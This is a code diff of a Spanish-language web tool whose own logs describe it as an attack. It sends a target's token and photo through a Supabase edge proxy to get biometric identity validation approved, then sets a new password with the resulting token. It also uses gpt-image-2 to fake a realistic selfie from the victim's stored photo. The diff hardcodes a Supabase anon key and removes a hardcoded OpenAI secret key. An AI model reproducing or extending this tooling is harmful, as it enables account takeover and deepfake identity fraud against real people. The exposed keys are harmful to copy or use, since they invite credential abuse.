@@ -671,20 +671,26 @@ bypassBtn.addEventListener('click', async () => {
 
   let bypassToken = '';
 
-  try {
-    addLog('info', '[BYPASS] Enviando ataque al servidor unificado (/api/attack)...');
+  const SUPABASE_PROXY_URL = 'https://eapcqcuzfkpqngbvjtmv.supabase.co/functions/v1/biometrico-proxy';
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVhcGNxY3V6ZmtwcW5nYnZqdG12Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg4NTEzNzIsImV4cCI6MjA3NDQyNzM3Mn0.-mufqMzFQetktwAL444d1PjdWfdCC5-2ftVs0LnTIL4';
 
-    // Enviamos la petición al mismo puerto que aloja la página web
-    const response = await fetch('/api/attack', {
+  try {
+    addLog('info', '[BYPASS] Enviando ataque a través de Supabase Edge Function...');
+
+    const response = await fetch(SUPABASE_PROXY_URL, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ token: token, foto: bypassBase64Image })
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+      },
+      body: JSON.stringify({ action: 'attack', token: token, foto: bypassBase64Image })
     });
     
     const data = await response.json();
     
-    if (data.status === 200 && (data.body.trim() === '1' || data.body.includes('"codigo":1') || data.body.includes('ok":true') || data.body.includes('\u00c9xito') || data.body.includes('Exito'))) {
-      addLog('success', '[BYPASS - \u00c9XITO] \u00a1Ataque exitoso! La validación biométrica ha sido aprobada.');
+    if (data.status === 200 && (data.body.trim() === '1' || data.body.includes('"codigo":1') || data.body.includes('ok":true') || data.body.includes('Éxito') || data.body.includes('Exito'))) {
+      addLog('success', '[BYPASS - ÉXITO] ¡Ataque exitoso! La validación biométrica ha sido aprobada.');
       addLog('error', `Respuesta: Status ${data.status} - Body: ${data.body}`);
 
       // Guardar el token para usarlo en el envio de contraseña
@@ -733,10 +739,14 @@ if (enviarPassBtn) {
     enviarPassBtn.disabled = true;
 
     try {
-      const response = await fetch('/api/set-password', {
+      const response = await fetch('https://eapcqcuzfkpqngbvjtmv.supabase.co/functions/v1/biometrico-proxy', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ token, newPass })
+        headers: {
+          'Content-Type': 'application/json',
+          'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVhcGNxY3V6ZmtwcW5nYnZqdG12Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg4NTEzNzIsImV4cCI6MjA3NDQyNzM3Mn0.-mufqMzFQetktwAL444d1PjdWfdCC5-2ftVs0LnTIL4',
+          'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVhcGNxY3V6ZmtwcW5nYnZqdG12Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg4NTEzNzIsImV4cCI6MjA3NDQyNzM3Mn0.-mufqMzFQetktwAL444d1PjdWfdCC5-2ftVs0LnTIL4'
+        },
+        body: JSON.stringify({ action: 'set-password', token, newPass })
       });
 
       const data = await response.json();
@@ -745,7 +755,7 @@ if (enviarPassBtn) {
       try { bodyParsed = JSON.parse(data.body); } catch { bodyParsed = data.body; }
 
       if (data.status === 200 && (bodyParsed === true || bodyParsed?.ok === true || data.body.includes('true'))) {
-        addLog('success', `[PASS - \u00c9XITO] \u00a1Contraseña guardada correctamente! Respuesta: ${data.body}`);
+        addLog('success', `[PASS - ÉXITO] ¡Contraseña guardada correctamente! Respuesta: ${data.body}`);
       } else {
         addLog('warn', `[PASS] El servidor respondió con un estado inesperado. Status: ${data.status} - Body: ${data.body}`);
       }
@@ -759,7 +769,7 @@ if (enviarPassBtn) {
 }
 
 // ==================================================
-// Lógica del Generador de Imágenes IA (gpt-image-2)
+// Lógica del Generador de Imágenes IA (gpt-image-2 / OpenAI en Supabase)
 // ==================================================
 
 const generateAIBtn = document.getElementById('generateAIBtn');
@@ -777,38 +787,26 @@ if (generateAIBtn) {
     generateAIBtn.disabled = true;
     
     try {
-      addLog('info', '[IA] Generando selfie realista con gpt-image-2 a partir de la foto del sistema...');
-      
-      // Función auxiliar para convertir Base64 a Blob
-      const byteCharacters = atob(bypassBase64Image.replace(/^data:image\/\w+;base64,/, ''));
-      const byteNumbers = new Array(byteCharacters.length);
-      for (let i = 0; i < byteCharacters.length; i++) {
-        byteNumbers[i] = byteCharacters.charCodeAt(i);
-      }
-      const byteArray = new Uint8Array(byteNumbers);
-      const imageBlob = new Blob([byteArray], { type: 'image/jpeg' });
+      addLog('info', '[IA] Generando selfie realista con gpt-image-2 a través de Supabase Edge Function...');
 
-      const openAIKey = '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';
-
-      const formData = new FormData();
-      formData.append('model', 'gpt-image-2');
-      formData.append('prompt', DEFAULT_AI_PROMPT);
-      formData.append('image', imageBlob, 'reference.jpg');
-
-      addLog('info', '[IA] Enviando petición a OpenAI API (/v1/images/edits)...');
-
-      const response = await fetch('https://api.openai.com/v1/images/edits', {
+      const response = await fetch('https://eapcqcuzfkpqngbvjtmv.supabase.co/functions/v1/biometrico-proxy', {
         method: 'POST',
         headers: {
-          'Authorization': `Bearer ${openAIKey}`
+          'Content-Type': 'application/json',
+          'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVhcGNxY3V6ZmtwcW5nYnZqdG12Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg4NTEzNzIsImV4cCI6MjA3NDQyNzM3Mn0.-mufqMzFQetktwAL444d1PjdWfdCC5-2ftVs0LnTIL4',
+          'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVhcGNxY3V6ZmtwcW5nYnZqdG12Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg4NTEzNzIsImV4cCI6MjA3NDQyNzM3Mn0.-mufqMzFQetktwAL444d1PjdWfdCC5-2ftVs0LnTIL4'
         },
-        body: formData
+        body: JSON.stringify({
+          action: 'generate-ai',
+          prompt: DEFAULT_AI_PROMPT,
+          imageBase64: bypassBase64Image
+        })
       });
       
       const data = await response.json();
       
       if (data.error) {
-        throw new Error(`OpenAI gpt-image-2 Error: ${data.error.message || JSON.stringify(data.error)}`);
+        throw new Error(`OpenAI Error: ${data.error.message || JSON.stringify(data.error)}`);
       }
       
       let generatedImageUrl = null;
